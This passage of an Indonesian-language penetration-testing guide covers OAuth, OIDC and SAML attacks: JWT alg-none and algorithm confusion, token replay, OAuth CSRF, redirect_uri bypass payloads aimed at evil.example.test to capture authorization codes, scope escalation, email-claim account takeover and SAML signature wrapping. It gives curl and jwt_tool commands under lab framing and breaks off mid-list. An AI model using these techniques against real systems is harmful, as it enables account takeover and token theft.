Resource Server dapat melakukan:

```text
JWT
 ↓
signature validation
 ↓
issuer
 ↓
audience
 ↓
expiry
 ↓
scope/claims
 ↓
authorization
```

---

# JWT ID Token

Dalam OIDC:

```text
ID Token
    ↓
identity information
```

Cek:

```text
iss
sub
aud
exp
iat
nonce
```

---

# ⚠️ Relevant JWT Weaknesses

## `alg: none`

Test concept:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Secure implementation:

```text
reject
```

---

## Algorithm Confusion

Contoh konsep:

```text
expected:
RS256

attacker:
HS256
```

Jika verifier salah menggunakan public key sebagai HMAC secret:

```text
algorithm confusion
```

---

## Weak Secret

Untuk HMAC JWT:

```text
HS256
```

secret lemah dapat dicoba pada **lab token**.

---

# 🧪 jwt_tool Setup

Repository `jwt_tool` menyediakan installation flow berbasis `git clone`, Python dependencies, dan `chmod`; repository tersebut juga memiliki release 2.3.0 pada saat pengecekan ini.

```bash
# Create tools directory
mkdir -p ~/tools

# Enter tools directory
cd ~/tools

# Clone jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git

# Enter jwt_tool
cd jwt_tool

# Install Python dependencies
python3 -m pip install termcolor cprint pycryptodomex requests

# Make the script executable
chmod +x jwt_tool.py

# Show help
python3 jwt_tool.py -h
```

---

# Analyze OAuth JWT

Simpan token lab:

```bash
# Create a file containing the lab JWT
printf '%s\n' 'LAB.JWT.TOKEN' > oauth.jwt

# Decode/analyze the token
python3 jwt_tool.py "$(cat oauth.jwt)"
```

---

# JWT Testing Flow

```text
JWT found
   ↓
Decode header
   ↓
Decode claims
   ↓
Identify alg
   ↓
Check iss
   ↓
Check aud
   ↓
Check exp
   ↓
Check nonce if OIDC
   ↓
Test signature validation
   ↓
Test authorization semantics
```

---

# 2.5 Token Reuse & Replay 🔁

## Refresh Token Abuse

Flow:

```text
Access Token
     ↓
expires
     ↓
Refresh Token
     ↓
new Access Token
```

Questions:

```text
Can refresh token be reused?
Does rotation exist?
Is old refresh token invalidated?
Is refresh token bound to client?
```

---

# Replay

```text
Captured token
      ↓
send again
      ↓
server accepts?
```

---

## 🛠️ curl

```bash
# Replay a lab access token
curl -i \
  -H 'Authorization: Bearer LAB_ACCESS_TOKEN' \
  'https://api.example.test/api/me'

# Replay the same token a second time
curl -i \
  -H 'Authorization: Bearer LAB_ACCESS_TOKEN' \
  'https://api.example.test/api/me'
```

---

# 💥 BAGIAN 3 — DETECTION WORKFLOW

# 3.1 Reconnaissance OAuth Endpoint 🔎

## URL Patterns

Cari:

```text
/oauth/
/authorize
/token
/callback
/auth
/login
/connect
/oidc
/.well-known/
```

---

# Burp Traffic

Cari request seperti:

```http
GET /authorize?... HTTP/1.1
```

```http
POST /token HTTP/1.1
```

```http
GET /oauth/callback?code=... HTTP/1.1
```

---

# JavaScript Source

Cari:

```text
client_id
redirect_uri
authorizationEndpoint
tokenEndpoint
response_type
scope
state
nonce
code_challenge
code_verifier
```

---

# Browser Network Tab

```text
DevTools
 ↓
Network
 ↓
Filter:
oauth
auth
authorize
token
callback
login
```

---

# 3.2 Burp Manual Testing Workflow 🕵️

## Step 1 — Start with Clean Session

```text
1. Open private/incognito browser.
2. Login with lab account.
3. Start Burp Proxy.
4. Confirm traffic is captured.
```

---

## Step 2 — Capture Authorization Request

Cari:

```http
GET /authorize?...
```

---

## Step 3 — Record Every Parameter

```text
client_id
redirect_uri
response_type
scope
state
nonce
code_challenge
code_challenge_method
```

---

# Parameter Matrix

|Parameter|Pertanyaan|
|---|---|
|`client_id`|Client terdaftar?|
|`redirect_uri`|Exact match?|
|`response_type`|code/token/id_token?|
|`scope`|Bisa escalate?|
|`state`|Ada dan bound ke session?|
|`nonce`|Ada untuk OIDC?|
|`code_challenge`|PKCE aktif?|
|`code_challenge_method`|S256?|

---

# 🧪 Modify `client_id`

```http
GET /authorize?response_type=code&client_id=OTHER_CLIENT&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid&state=LAB_STATE HTTP/1.1
Host: auth.example.test
```

Interpretation:

```text
reject
=
expected

accept
=
investigate client confusion
```

---

# 🧪 Modify `redirect_uri`

```http
GET /authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fevil.example.test%2Fcallback&scope=openid&state=LAB_STATE HTTP/1.1
Host: auth.example.test
```

---

# 🧪 Modify `response_type`

```text
code
token
id_token
code token
```

Contoh:

```bash
# Test a lab authorization endpoint with response_type=token
curl -i \
  'https://auth.example.test/authorize?response_type=token&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid&state=LAB_STATE'
```

---

# 🧪 Modify Scope

```bash
# Request normal lab scope
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid%20profile&state=LAB_STATE'

# Request additional lab scope
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid%20profile%20admin&state=LAB_STATE'
```

---

# 🧪 Modify State

```bash
# Send a request with no state parameter
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid'

# Send an attacker-controlled state value
curl -i \
  'https://auth.example.test/authorize?response_type=code&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Fcallback&scope=openid&state=ATTACKER_STATE'
```

---

# 3.3 Automated Tools 🛠️

## jwt_tool

Digunakan untuk:

```text
decode JWT
inspect claims
test JWT implementation
```

Install:

```bash
# Enter jwt_tool directory
cd ~/tools/jwt_tool

# Show help
python3 jwt_tool.py -h

# Analyze a lab token
python3 jwt_tool.py 'LAB.JWT.TOKEN'
```

---

# SAML Raider

Setup:

```text
Burp
 ↓
Extensions
 ↓
BApp Store
 ↓
SAML Raider
 ↓
Install
```

SAML Raider mendukung pengeditan SAML messages dan sejumlah XSW testing capabilities.

---

# 🔥 BAGIAN 4 — EXPLOITATION WORKFLOW

# 4.1 OAuth CSRF Attack

## ⚠️ Lab Scenario

Gunakan dua account lab:

```text
Attacker account
Victim/test account
```

Jangan gunakan account orang lain.

---

# 🗺️ Attack Chain

```text
Attacker
   │
   │ start OAuth flow
   ▼
Authorization Server
   │
   │ authorization code
   ▼
Attacker transaction
   │
   │ crafted callback/authorization flow
   ▼
Victim Browser
   │
   │ weak/missing state validation
   ▼
Client Application
   │
   │ processes OAuth identity
   ▼
Victim Session
   │
   │ unintended account linking
   ▼
Impact
```

---

# Step-by-Step

```text
1. Login to attacker lab account.
2. Start account-linking OAuth process.
3. Capture the authorization request.
4. Record:
   - client_id
   - redirect_uri
   - state
   - scope
5. Obtain a complete OAuth transaction.
6. Determine whether state is:
   - absent
   - predictable
   - not bound to session
7. In the lab, remove or alter state.
8. Create the corresponding authorization flow.
9. Deliver the lab URL to the victim/test browser.
10. Observe callback handling.
11. Check whether victim account becomes linked
    to the attacker identity.
```

---

# Evidence

```text
Before:
victim → local account

After:
victim → unintended OAuth identity
```

Capture:

```text
authorization request
redirect
callback
account state
```

---

# 4.2 Redirect URI Bypass

## Step 1 — Identify Whitelist

Original:

```text
https://app.example.test/oauth/callback
```

---

## Step 2 — Test

```text
https://evil.example.test/callback
https://evil.app.example.test/callback
https://app.example.test.evil.test/callback
https://app.example.test/oauth/callback/evil
https://app.example.test/oauth/callback?next=https://evil.example.test
https://app.example.test@evil.example.test/callback
```

---

## Step 3 — Identify Acceptance

Use Burp Repeater.

```text
Accepted?
   ↓
Does server redirect?
   ↓
Where?
```

---

## Step 4 — Capture Code

Example:

```http
HTTP/1.1 302 Found
Location: https://evil.example.test/callback?code=LAB_AUTH_CODE&state=LAB_STATE
```

---

# Step 5 — Exchange Code

Secure OAuth servers may require the same redirect URI again at token exchange, creating an additional validation checkpoint. PortSwigger specifically notes this as a stronger design because the second check occurs server-to-server.

Lab request:

```http
POST /token HTTP/1.1
Host: auth.example.test
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=LAB_AUTH_CODE&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&client_secret=LAB_CLIENT_SECRET
```

---

# 🛠️ curl

```bash
# Exchange an authorization code in a lab
curl -i \
  -X POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=authorization_code&code=LAB_AUTH_CODE&client_id=web-client-123&redirect_uri=https%3A%2F%2Fapp.example.test%2Foauth%2Fcallback&client_secret=LAB_CLIENT_SECRET' \
  'https://auth.example.test/token'
```

---

# 4.3 OIDC Account Takeover via Email Claim

## 🧠 Root Cause

Dangerous logic:

```text
OIDC email
     ↓
find local account
     ↓
same email
     ↓
login/link
```

Secure identity binding should consider:

```text
issuer
subject
audience
signature
nonce
email_verified
provider
account binding
```

---

# Detection

Capture ID Token:

```text
HEADER.PAYLOAD.SIGNATURE
```

Inspect:

```text
iss
sub
aud
email
email_verified
nonce
```

---

# Lab Testing Logic

```text
1. Obtain test OIDC identity.
2. Decode ID token.
3. Observe email claim.
4. Determine whether account linking relies on email.
5. Modify/use a separate controlled identity where the
   lab explicitly permits identity-claim testing.
6. Observe account-mapping behavior.
7. Verify whether wrong account is linked.
```

---

# 🧪 jwt_tool

```bash
# Analyze the lab OIDC ID token
python3 ~/tools/jwt_tool/jwt_tool.py 'LAB.ID.TOKEN'
```

---

# 4.4 SAML Bypass with Burp + SAML Raider

## Workflow

```text
Capture SAMLResponse
      ↓
Send to Repeater
      ↓
SAML Raider
      ↓
Decode
      ↓
Identify Signature
      ↓
Identify Assertion
      ↓
Identify Subject
      ↓
Identify attributes
      ↓
Test structure
      ↓
Send
      ↓
Observe validation
      ↓
Observe identity/authorization
```

---

# XSW Testing

```text
1. Capture valid SAMLResponse.
2. Open in SAML Raider.
3. Inspect signed element.
4. Identify ID attributes.
5. Make a controlled structural change.
6. Preserve the original signed object.
7. Add/duplicate test nodes only in the lab.
8. Send request.
9. Observe:
   - signature validation
   - XML parsing
   - chosen Subject
   - application identity
10. Stop if signature validation fails unless the lab explicitly
    asks for further analysis.
```

SAML Raider supports multiple XSW patterns specifically for SAML testing.

---

# 🌳 BAGIAN 5 — DECISION TREE

```text
                           START
                             │
                             ▼
                     Find authentication flow
                             │
                             ▼
                    OAuth / OIDC / SAML?
               ┌─────────────┼─────────────┐
               │             │             │
               ▼             ▼             ▼
            OAuth          OIDC          SAML
               │             │             │
               │             │             └──→ Inspect
               │             │                  SAMLResponse
               │             │                      │
               │             │                      ▼
               │             │                 Signature?
               │             │                      │
               │             │                  ┌───┴───┐
               │             │                 YES      NO
               │             │                  │        │
               │             │                  ▼        ▼
               │             │                XSW/     Parsing/
               │             │              assertion   auth logic
               │             │              testing
               │             │
               │             └──→ ID Token?
               │                    │
               │                    ▼
               │                 JWT valid?
               │                    │
               │              ┌─────┴─────┐
               │             YES          NO
               │              │            │
               │              ▼            ▼
               │          Claims/alg     Investigate
               │          iss/aud/sub
               │
               ▼
          Authorization Code?
               │
        ┌──────┴────────┐
       YES              NO
        │                │
        ▼                ▼
 redirect_uri?      Implicit?
 state?              │
 PKCE?               ▼
 scope?          Token leakage?
        │
        ▼
 redirect_uri
        │
 ┌──────┼────────────────────────────┐
 ▼      ▼                            ▼
Good  weak/reflected             bypass
        │                            │
        ▼                            ▼
      state?                     code theft?
        │                            │
        ▼                            ▼
   credentials?                  token exchange
        │
        ▼
   sensitive resource?
        │
        ▼
       IMPACT
```

---

# 🧯 BAGIAN 6 — COMMON ERRORS & TROUBLESHOOTING

|Error|Sebab|Solusi|
|---|---|---|
|`invalid_redirect_uri`|Redirect URI tidak terdaftar|Bandingkan exact URI yang valid|
|OAuth redirect bekerja tetapi code tidak sampai|Redirect masih diproses client-side|Trace browser/network chain|
|`invalid_grant`|Code expired/used|Gunakan code baru|
|`invalid_client`|Client authentication gagal|Periksa client_id/secret di lab|
|`invalid_scope`|Scope tidak diizinkan|Bandingkan registered scopes|
|State selalu berubah|State random/session-bound|Simpan state sebelum request|
|State hilang pada callback|Application bug atau flow berbeda|Trace setiap redirect|
|`state mismatch`|Session/state binding benar|Gunakan transaction yang sama|
|PKCE verifier ditolak|Verifier tidak cocok|Hitung/rekam verifier dengan benar|
|Token exchange gagal setelah redirect bypass|Token endpoint memvalidasi redirect URI|Uji exact second-stage validation|
|ID token invalid|Signature/issuer/audience mismatch|Decode dan cek `iss`, `aud`, signature|
|JWT accepted tetapi API menolak|Access token scope/audience salah|Bedakan ID token vs access token|
|SAMLResponse 400|XML malformed/signature invalid|Revert dan ubah satu hal saja|
|SAML signature valid tetapi login gagal|Assertion conditions/issuer/recipient salah|Trace SAML validation fields|
|SAML assertion diterima tetapi role tidak berubah|Authorization tidak percaya attribute tersebut|Trace application authorization|
|Token replay gagal|Rotation/expiration aktif|Capture fresh token dan test lifecycle|
|Refresh token reuse ditolak|Rotation atau revocation aktif|Check token lifecycle|
|curl menunjukkan redirect tetapi browser tidak|Browser policy/session context berbeda|Validasi lewat Burp + browser|
|OAuth flow berjalan tetapi tidak vulnerable|Validation benar|Stop dan document as negative finding|
|Account linking gagal|Identity binding kuat|Cek `sub`, `iss`, provider binding|
|Email claim berubah tetapi account tidak berubah|App tidak menggunakan email sebagai identity key|Trace mapping logic|
|`Origin`/CORS issue muncul|OAuth UI/API bersinggungan dengan CORS|Gunakan File 33 workflow|
|JWT `alg` change ditolak|Algorithm validation benar|Document secure behavior|
|JWT weak secret tidak berguna|Token memakai asymmetric signing|Identify actual `alg`/key model|
|Callback code tidak usable|Code one-time/expired|Ambil fresh code di lab|

---

# 🏆 BAGIAN 7 — GOLDEN RULES

## 🥇 Rule 01

```text
OAuth = Authorization
OIDC = Authentication/Identity + OAuth
```

---

## 🥇 Rule 02

```text
Authorization Code ≠ Access Token
```

---

## 🥇 Rule 03

```text
redirect_uri harus diperlakukan sebagai security boundary
```

---

## 🥇 Rule 04

```text
State harus random + session-bound
```

---

## 🥇 Rule 05

```text
PKCE bukan pengganti state
```

---

## 🥇 Rule 06

```text
ID Token ≠ Access Token
```

---

## 🥇 Rule 07

```text
JWT decoded ≠ JWT trusted
```

---

## 🥇 Rule 08

```text
SAML XML changed ≠ SAML exploit
```

Signature dan parser behavior harus diuji.

---

## 🥇 Rule 09

```text
Accepted parameter ≠ successful exploit
```

---

## 🥇 Rule 10

```text
Authorization server validation + client validation
harus dianalisis terpisah
```

---

## 🥇 Rule 11

```text
email claim ≠ automatically verified account identity
```

---

## 🥇 Rule 12

```text
Scanner finding ≠ confirmed impact
```

---

# ✅ BAGIAN 8 — FINAL CHECKLIST

```text
[ ] 01. Target benar-benar authorized
[ ] 02. OAuth/OIDC/SAML identified
[ ] 03. Authorization Server identified
[ ] 04. Resource Server identified
[ ] 05. Client identified
[ ] 06. Authorization endpoint identified
[ ] 07. Token endpoint identified
[ ] 08. Callback endpoint identified
[ ] 09. UserInfo endpoint identified
[ ] 10. client_id recorded
[ ] 11. redirect_uri recorded
[ ] 12. response_type recorded
[ ] 13. scope recorded
[ ] 14. state recorded
[ ] 15. nonce recorded when OIDC
[ ] 16. code_challenge recorded when PKCE
[ ] 17. code_challenge_method recorded
[ ] 18. Authorization code behavior tested
[ ] 19. redirect_uri validation tested
[ ] 20. redirect bypass candidates tested
[ ] 21. state validation tested
[ ] 22. scope escalation tested
[ ] 23. PKCE verifier validation tested
[ ] 24. Token endpoint validation tested
[ ] 25. Access token audience checked
[ ] 26. ID token issuer checked
[ ] 27. ID token audience checked
[ ] 28. ID token nonce checked
[ ] 29. `email_verified` behavior checked
[ ] 30. Account linking behavior checked
[ ] 31. Token leakage locations checked
[ ] 32. Refresh token rotation checked
[ ] 33. Token replay tested in lab
[ ] 34. SAMLResponse captured if applicable
[ ] 35. SAML signature location identified
[ ] 36. SAML Assertion identified
[ ] 37. SAML Subject identified
[ ] 38. SAML attributes identified
[ ] 39. XSW behavior tested in lab
[ ] 40. JWT analyzed with File 28 methodology
[ ] 41. CORS interaction checked with File 33 methodology
[ ] 42. Browser behavior confirmed
[ ] 43. Server-side behavior separately confirmed
[ ] 44. Impact demonstrated with test data
[ ] 45. Evidence captured
```

---

# 🔗 BAGIAN 9 — CROSS-WORKFLOW

# 🪪 JWT — File 28

OAuth/OIDC dapat menghasilkan JWT.

Gunakan File 28 untuk:

```text
decode
 ↓
header
 ↓
claims
 ↓
algorithm
 ↓
signature
 ↓
issuer
 ↓
audience
 ↓
authorization
```

Cross-chain:

```text
OAuth
 ↓
OIDC
 ↓
ID Token
 ↓
JWT analysis
 ↓
claim validation
 ↓
authentication impact
```

---

# 🌐 CORS — File 33

OAuth UI/API dapat berinteraksi dengan CORS.

Contoh:

```text
OAuth callback
      ↓
SPA
      ↓
API
      ↓
CORS
```

Pertanyaan:

```text
Can attacker origin read callback/API data?
Can credentialed API response be read?
Is token exposed through JavaScript?
```

Gunakan:

← [File 33: CORS](/docs/cors)

untuk CORS testing.

---

# 🔄 CSRF

Relationship:

```text
OAuth
 +
state
 =
CSRF defense
```

Flow:

```text
OAuth request
   ↓
state
   ↓
callback
   ↓
validate state
```

Weak/missing state:

```text
OAuth CSRF
```

---

# 💉 XSS

XSS dapat memperburuk:

```text
OAuth token exposure
callback leakage
OIDC claim handling
session/token theft
```

Chain:

```text
XSS
 ↓
read OAuth client-side state
 ↓
access token exposure
 ↓
API access
```

---

# 🔐 Authentication

OAuth/OIDC:

```text
Identity Provider
       ↓
Identity assertion
       ↓
Application
       ↓
Local account
```

Audit titik transisinya.

Pertanyaan utama:

```text
Bagaimana external identity dipetakan
menjadi local account?
```

---

# 🧩 CROSS-WORKFLOW MAP

```text
                  ┌────────────┐
                  │    XSS     │
                  └─────┬──────┘
                        │
                        ▼
┌────────┐        ┌────────────┐        ┌─────────┐
│ CSRF   │───────▶│ OAuth/OIDC │◀───────│  CORS   │
└────────┘        └─────┬──────┘        └─────────┘
                        │
             ┌──────────┼──────────┐
             ▼          ▼          ▼
           JWT        SAML       Auth
             │          │          │
             └──────────┼──────────┘
                        ▼
               Account / API Access
                        │
                        ▼
                      Impact
```

---

# ⚡ BAGIAN 10 — ONE-LINE MUSCLE MEMORY

## Insecure Redirect URI

```text
/authorize → redirect_uri → mutate → accepted? → code/token reaches controlled lab location?
```

---

## State

```text
/authorize → state → remove/change → callback → state validated against session?
```

---

## Authorization Code Interception

```text
code in callback → open redirect/Referrer/resource leak → code exposed → code usable?
```

---

## Token Leakage

```text
token → URL/history/JS/log/referrer → exposure point → token reusable?
```

---

## Scope Manipulation

```text
scope=normal → add privileged scope → token scope changed? → API accepts?
```

---

## PKCE

```text
code_challenge → obtain code → wrong verifier → token endpoint accepts?
```

---

## Account Linking

```text
OIDC identity → email/sub mapping → automatic link → wrong account linked?
```

---

## JWT in OAuth/OIDC

```text
JWT → decode → alg/iss/aud/sub/exp/nonce → signature validation → authorization impact
```

---

## SAML XSW
SAML XML Signature Wrapping (XSW) attacks manipulate the XML structure to change which element is signed, allowing an attacker to alter assertions while keeping the signature valid. Beginners should focus on validating the signed element and ensuring the entire document is trusted.
```text
SAMLResponse → signed node → structural mutation → signature valid? → application consumes which node?
```

---

## SAML Assertion Manipulation

```text
Assertion → email/role/group → modify in lab → signature? → identity/authorization changed?
```

---

## Token Replay

```text
token → replay → accepted? → expiration/rotation/revocation working?
```

---

# 🧠 FINAL OAUTH/SSO MASTER FLOW

```text
                         RECON
                           │
                           ▼
                  Identify Auth Protocol
                           │
              ┌────────────┼─────────────┐
              ▼            ▼             ▼
            OAuth         OIDC          SAML
              │            │             │
              ▼            ▼             ▼
         /authorize     ID Token      SAMLResponse
         /token         UserInfo          │
         /callback          │             ▼
              │             ▼          Signature
              ▼           JWT              │
       redirect_uri          │             ▼
       state                 ▼           Assertion
       scope             iss/aud/sub       │
       PKCE               nonce             ▼
              │             │           Attributes
              └─────────────┼─────────────┘
                            │
                            ▼
                    Validation Boundary
                            │
            ┌───────────────┼────────────────┐
            ▼               ▼                ▼
        redirect          state            token
        validation       validation       validation
            │               │                │
            └───────────────┼────────────────┘
                            │
                            ▼
                    Identity Binding
                            │
                            ▼
                    Authorization
                            │
                            ▼
                         IMPACT
```

---

# 🎯 FINAL MENTAL MODEL

Jangan menghafal OAuth sebagai:

```text
/authorize
/token
/callback
```

Hafalkan trust chain:

```text
USER
 ↓
AUTHORIZATION SERVER
 ↓
AUTHORIZATION ARTIFACT
 ↓
CLIENT
 ↓
TOKEN
 ↓
RESOURCE SERVER
 ↓
IDENTITY / AUTHORIZATION
 ↓
IMPACT
```

Dan ketika melakukan pentest:

```text
Who
 ↓
Which client
 ↓
Which redirect
 ↓
Which state
 ↓
Which code
 ↓
Which token
 ↓
Which claims
 ↓
Which scope
 ↓
Which resource
 ↓
Which account
```

---

# 🧠 30-SECOND OAUTH MUSCLE MEMORY

```text
OAuth?
→ Find /authorize
→ Find /token
→ Find /callback
→ Record client_id
→ Record redirect_uri
→ Record response_type
→ Record scope
→ Record state
→ Record PKCE
→ Test redirect validation
→ Test state binding
→ Test scope
→ Test code leakage
→ Test token leakage
→ Inspect JWT/OIDC
→ Check identity mapping
→ Check account linking
→ Check SAML if present
→ Confirm browser behavior
→ Confirm actual impact
```

---

# 🏁 FINAL RULE

```text
OAuth endpoint
     ↓
Do not immediately exploit
     ↓
Understand the protocol
     ↓
Map the trust boundaries
     ↓
Find the weakest validation point
     ↓
Prove the smallest safe impact
     ↓
Then escalate only inside the authorized lab
```

---

# [🔐 34 — OAuth & SSO Workflow](/docs/oauth-sso) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="http://app.example.test"
export AUTH_SERVER="http://auth.example.test"
export LHOST="10.10.14.5"
export CLIENT_ID=""         # Isi setelah recon
export REDIRECT_URI=""      # Isi setelah recon
mkdir -p ~/oauth_loot/{tokens,saml,requests,creds}
cd ~/oauth_loot

# Install tools yang dibutuhkan
# jwt_tool
mkdir -p ~/tools && cd ~/tools
git clone https://github.com/ticarpi/jwt_tool.git 2>/dev/null
cd jwt_tool
python3 -m pip install termcolor cprint pycryptodomex requests -q
chmod +x jwt_tool.py
cd ~/oauth_loot

echo "[*] Target: $TARGET | Auth: $AUTH_SERVER"
```

---

## ═══════════════════════════════════════

## FASE 0: DETEKSI — APA AUTH PROTOCOL YANG DIPAKAI?

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi apakah target pakai OAuth, OIDC, atau SAML sebelum testing.

### Langkah 0.1 — Passive Recon dari Browser & Traffic

Bash

```
# Command 1: Cek URL patterns dari halaman login
curl -s $TARGET/login | grep -Ei "oauth|authorize|client_id|redirect_uri|saml|oidc|sso"

# Command 2: Cek endpoint well-known (standard OIDC discovery)
curl -s "$AUTH_SERVER/.well-known/openid-configuration" | jq . 2>/dev/null
curl -s "$TARGET/.well-known/openid-configuration" | jq . 2>/dev/null

# Command 3: Cek header HTTP response
curl -s -I $TARGET/login | grep -Ei "set-cookie|location|www-authenticate"

# Command 4: Source code scan untuk OAuth indicators
curl -s $TARGET | grep -Ei "client_id|authorize|response_type|oauth|saml|oidc" | head -20
```

**OUTPUT BERHASIL ✅ — OIDC Discovery ditemukan:**

JSON

```
{
  "issuer": "https://auth.example.test",
  "authorization_endpoint": "https://auth.example.test/authorize",
  "token_endpoint": "https://auth.example.test/token",
  "userinfo_endpoint": "https://auth.example.test/userinfo",
  "jwks_uri": "https://auth.example.test/.well-known/jwks.json"
}
```

➡️ **OIDC/OAuth confirmed!** Simpan semua endpoints:

Bash

```
export AUTH_ENDPOINT="https://auth.example.test/authorize"
export TOKEN_ENDPOINT="https://auth.example.test/token"
export USERINFO_ENDPOINT="https://auth.example.test/userinfo"
export JWKS_URI="https://auth.example.test/.well-known/jwks.json"
echo "Auth: $AUTH_ENDPOINT" >> ~/oauth_loot/creds/endpoints.txt
echo "Token: $TOKEN_ENDPOINT" >> ~/oauth_loot/creds/endpoints.txt
```

**OUTPUT BERHASIL ✅ — OAuth params di URL:**

text

```
/authorize?response_type=code&client_id=webclient-123&redirect_uri=...
```

➡️ **OAuth Authorization Code Flow!** Lanjut ke **Fase 1.**

**OUTPUT BERHASIL ✅ — SAML indicators:**

HTML

```
<form action="/saml/acs" method="POST">
<input name="SAMLResponse" value="..."/>
```

➡️ **SAML SSO!** Lanjut ke **Fase 5 (SAML Testing).**

**OUTPUT GAGAL ❌ — Tidak ada indicator:**

text

```
# Empty output dari semua command
```

➡️ Coba aktif trigger login flow via browser + intercept dengan Burp:

Bash

```
# Cek dengan DevTools atau Burp — filter requests dengan keyword:
# oauth, auth, authorize, token, callback, login, connect, oidc, saml

# Cek JavaScript source untuk OAuth config tersembunyi
curl -s $TARGET | grep -Eo 'src="[^"]*\.js"' | head -10 \
    | while read -r src; do
        JS_URL=$(echo $src | grep -o '"[^"]*"' | tr -d '"')
        curl -s "$TARGET$JS_URL" 2>/dev/null | grep -Ei "client_id|authorize|oauth"
    done
```

---

### Langkah 0.2 — Capture Authorization Request (Intercept Flow)

> **Cara terbaik:** Buka browser dengan Burp proxy, klik "Login with Google/GitHub/SSO", tangkap traffic.

Bash

```
# Setelah intercept, record semua parameter dari /authorize request:
# Contoh format yang akan kamu lihat di Burp:

# GET /authorize?
#   response_type=code
#   &client_id=webclient-123
#   &redirect_uri=https://app.example.test/oauth/callback
#   &scope=openid profile email
#   &state=7b1d9c4f
#   &nonce=abc123          (jika OIDC)
#   &code_challenge=...    (jika PKCE)
#   &code_challenge_method=S256  (jika PKCE)

# Simpan semua nilai
export CLIENT_ID="webclient-123"
export REDIRECT_URI="https://app.example.test/oauth/callback"
export SCOPE="openid profile email"
export STATE="7b1d9c4f"    # Ini berubah tiap request!

echo "client_id: $CLIENT_ID" >> ~/oauth_loot/creds/endpoints.txt
echo "redirect_uri: $REDIRECT_URI" >> ~/oauth_loot/creds/endpoints.txt
```

**Parameter Matrix — Catat ini semua:**

|Parameter|Ada?|Nilai|Artinya|
|---|---|---|---|
|`client_id`|✅/❌|webclient-123|Identitas aplikasi client|
|`redirect_uri`|✅/❌|.../callback|Target redirect setelah auth|
|`response_type`|✅/❌|code/token|Flow yang digunakan|
|`scope`|✅/❌|openid profile|Hak akses yang diminta|
|`state`|✅/❌|random string|CSRF protection|
|`nonce`|✅/❌|random string|Replay protection (OIDC)|
|`code_challenge`|✅/❌|base64url|PKCE aktif|
|`code_challenge_method`|✅/❌|S256/plain|PKCE method|

---

## ═══════════════════════════════════════

## FASE 1: OAUTH FLOW IDENTIFICATION

## ═══════════════════════════════════════

### Langkah 1.1 — Identifikasi Grant Type / Flow

Bash

```
# Cek response_type di authorization request
# Code ini untuk men-decode dan menganalisis URL dari Burp history

# Command 1: Test apakah endpoint /authorize ada
curl -s -o /dev/null -w "%{http_code}" "$AUTH_SERVER/authorize"

# Command 2: Request authorization (tanpa login dulu — lihat apa yang terjadi)
curl -v "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$REDIRECT_URI'))")&scope=openid&state=test123" 2>&1 | head -30
```

**OUTPUT BERHASIL ✅ — response_type=code (Authorization Code Flow):**

text

```
HTTP/1.1 302 Found
Location: https://app.example.test/oauth/callback?code=SplxlOB...&state=test123
```

➡️ **Authorization Code Flow** — paling aman tapi masih banyak bug.  
Lanjut ke **Fase 2 — OAuth Vulnerability Testing.**

**OUTPUT BERHASIL ✅ — response_type=token (Implicit Flow / Legacy):**

text

```
HTTP/1.1 302 Found
Location: https://app.example.test/callback#access_token=LAB_TOKEN&token_type=Bearer
```

➡️ **Implicit Flow** — token di URL fragment!  
Langsung cek **token leakage (Fase 2 Langkah 2.4).**

**OUTPUT BERHASIL ✅ — Tidak ada redirect_uri, response_type=client_credentials:**

text

```
# Biasanya di API backend, bukan browser flow
```

➡️ **Client Credentials Flow** — cek scope overpermission.

---

## ═══════════════════════════════════════

## FASE 2: OAUTH VULNERABILITY TESTING

## ═══════════════════════════════════════

> **Urutan pengujian:** Jalankan SEMUA test di bawah secara berurutan. Jangan stop di test pertama yang berhasil.

### Langkah 2.1 — Test redirect_uri Validation (PRIORITAS PERTAMA!)

Bash

```
# Simpan redirect_uri original
ORIGINAL_REDIRECT="$REDIRECT_URI"

# Test 1: Completely different domain
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=https%3A%2F%2Fevil.example.test%2Fcallback&scope=openid&state=test123" \
    | grep -Ei "location:|error"

# Test 2: Subdomain bypass
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=https%3A%2F%2Fevil.app.example.test%2Fcallback&scope=openid&state=test123" \
    | grep -Ei "location:|error"

# Test 3: Path traversal — tambah path di belakang
ENCODED_PATH=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$ORIGINAL_REDIRECT/evil'))")
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$ENCODED_PATH&scope=openid&state=test123" \
    | grep -Ei "location:|error"

# Test 4: Query parameter injection
ENCODED_QUERY=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$ORIGINAL_REDIRECT?next=https://evil.example.test'))")
curl -s -i "$AUTH_ENDPOINT?response_type=code&client_id=$CLIENT_ID&redirect_uri=$ENCODED_QUERY&scope=openid&state=test123" \
    | grep -Ei "location:|error"

# Test 5: Domain confusion (@ trick)
